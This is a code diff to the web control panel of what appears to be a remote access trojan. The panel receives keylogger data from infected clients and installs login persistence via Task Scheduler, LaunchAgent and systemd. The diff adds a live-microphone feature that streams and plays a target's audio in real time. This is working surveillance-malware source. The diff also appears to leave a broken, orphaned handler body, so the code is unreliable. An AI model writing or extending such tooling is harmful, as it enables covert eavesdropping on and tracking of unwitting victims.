@@ -346,15 +346,19 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
 
       <!-- MIC -->
       <div class="tab-content" id="tab-mic">
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+          <button class="btn btn-red btn-sm" id="btn-mic-live" onclick="toggleMicLive()">🎙 LIVE LISTEN</button>
+          <span id="mic-live-status" style="font-size:10px;color:var(--dim);">IDLE</span>
+          <span style="color:var(--border);margin:0 4px;">|</span>
+          <span style="font-size:10px;color:var(--dim);">RECORD:</span>
+          <input type="number" id="mic-duration" value="10" min="1" max="120" style="width:55px;">
+          <span style="font-size:10px;color:var(--dim);">sec</span>
+          <button class="btn btn-green btn-sm" onclick="startMic()">⏺ RECORD</button>
+          <button class="btn btn-warn btn-sm" onclick="stopMic()">■ STOP</button>
+          <span id="mic-status" style="font-size:10px;color:var(--dim);"></span>
+        </div>
+        <canvas id="mic-visualizer" height="80" style="flex-shrink:0;width:100%;background:#050810;display:block;"></canvas>
         <div class="mic-area" id="mic-area">
-          <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
-            <span style="font-size:11px;color:var(--dim);">Duration:</span>
-            <input type="number" id="mic-duration" value="10" min="1" max="120" style="width:60px;">
-            <span style="font-size:11px;color:var(--dim);">seconds</span>
-            <button class="btn btn-green btn-sm" id="btn-mic-rec" onclick="startMic()">🎙 RECORD</button>
-            <button class="btn btn-red btn-sm" onclick="stopMic()">■ STOP</button>
-            <span id="mic-status" style="font-size:10px;color:var(--dim);">IDLE</span>
-          </div>
           <div id="mic-recordings"></div>
         </div>
       </div>
@@ -453,7 +457,7 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
         <div class="persist-area">
           <div style="margin-bottom:20px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
             <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚠ PERSISTENCE</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Installs the agent to auto-start on login.<br>Windows: Registry Run key · macOS: LaunchAgent · Linux: Systemd user service</div>
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Installs the agent to auto-start on login.<br>Windows: Task Scheduler (logon trigger, auto-restart) · macOS: LaunchAgent · Linux: Systemd user service</div>
           </div>
           <div style="display:flex;gap:10px;margin-bottom:20px;">
             <button class="btn btn-warn" onclick="persistInstall()">⚙ INSTALL AUTOSTART</button>
@@ -543,7 +547,81 @@ socket.on('keylog_data', data => {
   out.scrollTop = out.scrollHeight;
 });
 
-socket.on('mic_data', data => {
+socket.on('mic_live_chunk', data => {
+  if(!selectedClient || data.client_id !== selectedClient.id) return;
+  if(data.error){ addLog('Live mic error: '+data.error,'error'); return; }
+  // Decode PCM int16 and play + visualize
+  const raw = atob(data.data);
+  const buf = new Int16Array(raw.length/2);
+  for(let i=0;i<buf.length;i++) buf[i] = (raw.charCodeAt(i*2)) | (raw.charCodeAt(i*2+1)<<8);
+  const float = new Float32Array(buf.length);
+  for(let i=0;i<buf.length;i++) float[i] = buf[i]/32768;
+  // Play via Web Audio
+  if(micAudioCtx){
+    const ab = micAudioCtx.createBuffer(1, float.length, data.rate||22050);
+    ab.getChannelData(0).set(float);
+    const src = micAudioCtx.createBufferSource();
+    src.buffer = ab;
+    src.connect(micAudioCtx.destination);
+    src.start();
+  }
+  // Visualize
+  drawMicWave(float);
+});
+
+let micLive = false;
+let micAudioCtx = null;
+
+function toggleMicLive(){
+  if(!selectedClient) return;
+  if(!micLive){
+    micLive = true;
+    micAudioCtx = new (window.AudioContext||window.webkitAudioContext)();
+    sendCmd('mic_live_start');
+    document.getElementById('btn-mic-live').textContent = '■ STOP LIVE';
+    document.getElementById('btn-mic-live').className = 'btn btn-warn btn-sm';
+    document.getElementById('mic-live-status').textContent = '● LIVE';
+    document.getElementById('mic-live-status').style.color = 'var(--danger)';
+  } else {
+    micLive = false;
+    sendCmd('mic_live_stop');
+    if(micAudioCtx){ micAudioCtx.close(); micAudioCtx=null; }
+    document.getElementById('btn-mic-live').textContent = '🎙 LIVE LISTEN';
+    document.getElementById('btn-mic-live').className = 'btn btn-red btn-sm';
+    document.getElementById('mic-live-status').textContent = 'IDLE';
+    document.getElementById('mic-live-status').style.color = 'var(--dim)';
+    clearMicCanvas();
+  }
+}
+
+function drawMicWave(samples){
+  const canvas = document.getElementById('mic-visualizer');
+  if(!canvas) return;
+  const ctx = canvas.getContext('2d');
+  canvas.width = canvas.offsetWidth;
+  const w = canvas.width, h = canvas.height;
+  ctx.fillStyle = '#050810';
+  ctx.fillRect(0,0,w,h);
+  ctx.strokeStyle = '#ff3366';
+  ctx.lineWidth = 1.5;
+  ctx.beginPath();
+  const step = Math.ceil(samples.length/w);
+  for(let i=0;i<w;i++){
+    const s = samples[i*step]||0;
+    const y = (s*0.5+0.5)*h;
+    i===0 ? ctx.moveTo(i,y) : ctx.lineTo(i,y);
+  }
+  ctx.stroke();
+}
+function clearMicCanvas(){
+  const canvas = document.getElementById('mic-visualizer');
+  if(!canvas) return;
+  const ctx = canvas.getContext('2d');
+  canvas.width = canvas.offsetWidth;
+  ctx.fillStyle = '#050810';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+}
+
   if(!selectedClient || data.client_id !== selectedClient.id) return;
   document.getElementById('mic-status').textContent = 'RECEIVED';
   document.getElementById('mic-status').style.color = 'var(--accent)';
